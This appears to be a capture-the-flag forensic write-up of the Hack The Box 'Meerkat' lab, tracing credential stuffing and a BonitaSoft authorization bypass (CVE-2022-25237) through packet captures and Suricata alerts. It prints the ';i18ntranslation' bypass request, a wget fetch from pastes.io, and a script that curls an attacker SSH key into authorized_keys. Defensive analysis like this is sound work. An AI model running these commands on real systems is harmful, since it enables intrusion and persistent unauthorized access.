# 🦦 Bonitasoft Compromise Investigation — Meerkat

## 📌 Case Overview

**Sherlock Scenario:** Meerkat (Hack The Box)

Forela's internal security systems flagged suspicious network activity targeting the Business Management Platform. An alert indicated a potential specific exploit attempt against the BonitaSoft application. A packet capture (PCAP) and Suricata logs were provided for analysis to confirm the compromise, identify the attack vector, and determine post‑exploitation activity.

This investigation confirms a successful credential stuffing attack followed by exploitation of **CVE‑2022‑25237**, which allowed Remote Code Execution (RCE) and persistence.

---

## 🧭 Investigation Summary

* **Initial Vector:** Credential stuffing attack against web login portal
* **Vulnerability:** Authorization bypass in BonitaSoft (CVE‑2022‑25237)
* **Exploitation:** Appended `i18ntranslation` to API URLs to bypass permission checks
* **Impact:** Remote Code Execution (RCE)
* **Persistence:** SSH public key added to `authorized_keys`

---

## 1️⃣ Reconnaissance & Initial Access

**Attack Type:** Credential Stuffing
**Target Application:** BonitaSoft (Business Process Management)

Traffic analysis showed a high volume of HTTP POST requests to `/bonita/loginservice`. The attacker automated login attempts using multiple username and password combinations.

### Evidence

The PCAP shows rapid sequential login attempts with different usernames, consistent with credential stuffing.

**Successful Credentials:** `seb.broom@forela.co.uk`
**Attacker IP:** `138.199.59.221`

<img width="1646" height="825" alt="Screenshot 2026-02-19 093005" src="https://github.com/user-attachments/assets/0f6c0acc-5105-414b-8cf5-f6b200574493" />

---

## 2️⃣ Vulnerability Identification

After successful authentication, Suricata generated an alert tied to a known BonitaSoft exploit.

* **Alert:** ET EXPLOIT Bonitasoft Authorization Bypass M1
* **CVE:** CVE‑2022‑25237
* **Description:** Authorization bypass allowing unprivileged users to access privileged API endpoints via URL manipulation.

### Evidence

Suricata alert confirming detection of the exploit signature.

<img width="1569" height="570" alt="Screenshot 2026-02-19 092709" src="https://github.com/user-attachments/assets/eb5fb942-6f1f-4016-9ae9-c5be6eba652b" />


---

## 3️⃣ Exploitation & RCE

The attacker appended the string `i18ntranslation` to API requests, bypassing authorization filters.

**Observed malicious request:**

```
POST /bonita/API/pageUpload;i18ntranslation?action=add HTTP/1.1
```

Using this bypass, the attacker uploaded a malicious extension that enabled system command execution.

### Evidence

Wireshark shows the manipulated URL used to bypass access controls.

<img width="1903" height="311" alt="Screenshot 2026-02-19 083720" src="https://github.com/user-attachments/assets/c2675079-06c0-434b-a231-fae3acf6e4df" />


---

## 4️⃣ Command Execution & Payload Delivery

After gaining RCE, the attacker executed a command to download a persistence script.

* **Command:** `wget https://pastes.io/raw/bx5gcr0et8`
* **Source Domain:** `pastes.io`
* **Attacker IP:** `138.199.59.221`

The attacker hosted the payload on a text‑sharing site to avoid maintaining dedicated infrastructure.

### Evidence

The `wget` command appears in HTTP stream arguments.

<img width="1912" height="403" alt="image" src="https://github.com/user-attachments/assets/6e423752-61fb-4cd0-9f93-2558260026c3" />

---

## 5️⃣ Persistence Mechanism

The downloaded script was reconstructed from the PCAP. It appends an SSH public key to the target system.

### Script Content

```bash
#!/bin/bash
curl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys
sudo service ssh restart
```

* **Technique:** Account Manipulation (SSH Keys)
* **Public Key Source:** [https://pastes.io/raw/hffgra4unv](https://pastes.io/raw/hffgra4unv)
* **Target File:** `/home/ubuntu/.ssh/authorized_keys`

This grants persistent SSH access without needing a password.

### Evidence

Reconstructed script showing SSH key injection.

<img width="1637" height="694" alt="Screenshot 2026-02-19 092815" src="https://github.com/user-attachments/assets/c67e5335-d9df-47af-8036-db5021449228" />


---

## ⏱️ Attack Timeline

| Timestamp (UTC) | Event               | Description                                                   |
| --------------- | ------------------- | ------------------------------------------------------------- |
| 15:31:00        | Credential Stuffing | High volume login attempts to `/bonita/loginservice`          |
| 15:35:05        | Successful Login    | Credentials validated for `seb.broom`                         |
| 15:38:38        | Exploitation        | API request with `;i18ntranslation` exploiting CVE‑2022‑25237 |
| 15:38:52        | Payload Download    | `wget` retrieves script from pastes.io                        |
| 15:39:18        | Persistence         | SSH key appended to `authorized_keys`                         |

---

## 🗺️ MITRE ATT&CK Mapping

| Tactic            | ID        | Technique                                 |
| ----------------- | --------- | ----------------------------------------- |
| Credential Access | T1110.004 | Credential Stuffing                       |
| Initial Access    | T1190     | Exploit Public‑Facing Application         |
| Execution         | T1059.004 | Command and Scripting Interpreter (Bash)  |
| Persistence       | T1098.004 | Account Manipulation: SSH Authorized Keys |

---

## 🛡️ Recommendations

* **Patch Management:** Update BonitaSoft to remediate CVE‑2022‑25237
* **SSH Hardening:** Disable password auth and review `authorized_keys`
* **Network Filtering:** Restrict access to text‑sharing sites from servers
* **Rate Limiting:** Implement login rate limits and monitoring
* **Credential Response:** Reset credentials for `seb.broom` and remove rogue SSH keys

---

## 🧾 Conclusion

The Forela Business Management Platform was compromised through credential stuffing and exploitation of a known BonitaSoft authorization bypass vulnerability. The attacker achieved RCE and persistence by injecting an SSH key. Use of legitimate hosting platforms for payload delivery highlights the need for strict outbound filtering and monitoring.

